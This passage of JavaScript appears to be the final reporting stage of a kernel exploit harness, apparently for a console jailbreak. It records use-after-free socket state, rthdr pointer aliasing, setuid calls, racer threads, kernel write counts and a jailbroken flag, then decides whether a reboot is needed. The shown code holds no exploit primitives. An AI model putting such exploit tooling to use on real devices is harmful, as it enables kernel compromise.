        prioRestored: rep.restore ? !!rep.restore.prioOk : !rep.restoreNeeded,
        cleanupFailed: state.cleanupFailed || "",
        strandedCount: (rep.doNotClose || []).length,
        repairExhausted:
          !TW.tripletsValid() && TW.S.triplets.some((t) => t >= 0),
      });
      X.measured.verdict = v;

      const residue = [];
      if (E.S.setuidCalls)
        residue.push(
          "R6 setuid(1) x" +
            E.S.setuidCalls +
            " -- irreversible for the rest of the boot",
        );
      if (E.S.rlimitRaised)
        residue.push(
          "R18 RLIMIT_NOFILE raised and never lowered " + "(harmless)",
        );
      if (E.triggered) residue.push("R9 line A: the trigger fired");
      if (TW.corrupt) residue.push("R10/R11 LINE B: " + TW.corrupt);
      if (TW.tripletsValid() && !E.S.aliasesRepaired)
        residue.push(
          "R12 three aliases live on one chunk -- stable and " + "intended",
        );
      else if (E.S.aliasesRepaired)
        residue.push("R12 cleared: rthdr pointers zeroed, read back zero");
      if (E.S.freeFdIdx)
        residue.push(
          "R7 " + E.S.freeFdIdx + " pool fds already spent " + "(closed once)",
        );
      if (E.S.uafSock >= 0 && !E.S.uafClosed)
        residue.push("R8 uaf_socket " + E.S.uafSock + " left open");
      if (rep.leftOpen.length)
        residue.push("left open deliberately: " + rep.leftOpen.join(", "));
      if (E.S.kqOpen.length)
        residue.push("R14 " + E.S.kqOpen.length + " kqueue fds still open");
      for (const rr of residue) note("RESIDUE " + rr);

      flushMark(
        "POOPS-VERDICT",
        (v.reboot ? "REBOOT" : "FINE") +
          "-triggered=" +
          (E.triggered ? 1 : 0) +
          "-alias=" +
          (TW.corrupt ? 1 : 0) +
          "-triplet=" +
          (TW.tripletsValid() ? 1 : 0) +
          "-repaired=" +
          (E.S.aliasesRepaired ? 1 : 0) +
          "-jailbroken=" +
          (E.S.jailbroken ? 1 : 0) +
          "-kernelWrites=" +
          E.kernelWrites +
          "-reasons=" +
          v.all.length,
      );

      for (let ri = 0; ri < v.all.length; ++ri)
        note(
          "reboot reason " + (ri + 1) + "/" + v.all.length + ": " + v.all[ri],
        );
      if (v.all.length)
        flushMark(
          "POOPS-VERDICT-WHY",
          v.all
            .map((x) => String(x).slice(0, 60))
            .join(" || ")
            .slice(0, 400),
        );

      if (v.reboot)
        return FAIL(
          v.text +
            "\nall reasons: " +
            v.all.join(" | ") +
            "\nreboot now, from this page.",
        );

      const ver = v.verified || {};
      return PASS(
        v.text +
          " verified: bank " +
          (ver.teardown
            ? "freed and closed socket by socket"
            : "teardown did not run (nothing was open)") +
          "; racers " +
          (ver.racers
            ? "terminated, status = ST_EXITED for " + "every spawned racer"
            : "not all confirmed") +
          "; scheduler affinity " +
          (ver.schedAff ? "restored and read back" : "not read back") +
          ", priority " +
          (ver.schedPrio ? "restored and read back" : "not read back") +
          "; descriptors stranded on purpose: " +
          (rep.doNotClose || []).length +
          "; kernel writes: " +
          ver.kernelWrites +
          ".",
      );
    },
  });

  return L;
}
